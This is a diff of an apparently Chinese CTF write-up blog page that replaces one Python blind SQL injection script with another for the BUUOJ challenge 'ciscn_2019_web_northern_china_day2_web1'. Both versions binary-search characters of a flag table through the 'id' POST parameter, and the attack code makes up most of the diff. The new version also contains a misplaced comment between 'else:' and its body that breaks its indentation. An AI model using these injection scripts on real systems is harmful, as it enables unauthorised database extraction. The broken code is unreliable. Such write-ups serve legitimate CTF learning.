@@ -393,7 +393,7 @@ desc xxx">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.6k
+                    3.7k
                 </div>
                 
 
@@ -735,32 +735,36 @@ search<span class="token punctuation">(</span><span class="token punctuation">)<
     payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">" limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1 ),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))>"</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span>
     payload <span class="token operator">=</span> startStr <span class="token operator">+</span> payload <span class="token operator">+</span> endStr
     <span class="token keyword">return</span> payload</code></pre>
-<h3 id="花式盲注ciscn-2019-web-northern-china-day2-web1"><a href="#花式盲注ciscn-2019-web-northern-china-day2-web1" class="headerlink" title="花式盲注ciscn_2019_web_northern_china_day2_web1"></a>花式盲注ciscn_2019_web_northern_china_day2_web1</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> time
+<h3 id="花式盲注ciscn-2019-web-northern-china-day2-web1"><a href="#花式盲注ciscn-2019-web-northern-china-day2-web1" class="headerlink" title="花式盲注ciscn_2019_web_northern_china_day2_web1"></a>花式盲注ciscn_2019_web_northern_china_day2_web1</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time
+<span class="token keyword">import</span> requests
 
-url <span class="token operator">=</span> <span class="token string">"http://7ccdf96a-66d5-4601-a1f0-4a3cba45893c.node3.buuoj.cn/index.php"</span>
-payload <span class="token operator">=</span> <span class="token punctuation">{</span>
-    <span class="token string">"id"</span> <span class="token punctuation">:</span> <span class="token string">""</span>
-<span class="token punctuation">}</span>
-result <span class="token operator">=</span> <span class="token string">""</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    l <span class="token operator">=</span> <span class="token number">33</span>
-    r <span class="token operator">=</span><span class="token number">130</span>
-    mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
-    <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        payload<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0^"</span> <span class="token operator">+</span> <span class="token string">"(ascii(substr((select(flag)from(flag)),{0},1))>{1})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
-        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
-        <span class="token comment" spellcheck="true">#print(payload)</span>
-        <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-            l <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
+
+url <span class="token operator">=</span> <span class="token string">'http://7ccdf96a-66d5-4601-a1f0-4a3cba45893c.node3.buuoj.cn/index.php'</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true">#从33到126为可打印的字符</span>
+    low <span class="token operator">=</span> <span class="token number">33</span>
+    height <span class="token operator">=</span> <span class="token number">126</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">}</span>
+
+    <span class="token keyword">while</span> low <span class="token operator">&lt;=</span> height <span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> height<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
+        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'Hello'</span> <span class="token keyword">in</span> html <span class="token punctuation">:</span>
+            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
         <span class="token keyword">else</span><span class="token punctuation">:</span>
-            r <span class="token operator">=</span> mid
-        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">break</span>
-    result <span class="token operator">=</span> result <span class="token operator">+</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag: "</span> <span class="token punctuation">,</span>result<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true">#将小于和等于的情况一起考虑，所以在low~mid中间寻找</span>
+            height <span class="token operator">=</span> mid
+        <span class="token comment" spellcheck="true">#出现low = height = mid，若不判断会进入死循环</span>
+        <span class="token keyword">if</span> height <span class="token operator">==</span> mid <span class="token operator">==</span> low<span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+
+    flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+
 </code></pre>
 
             </div>
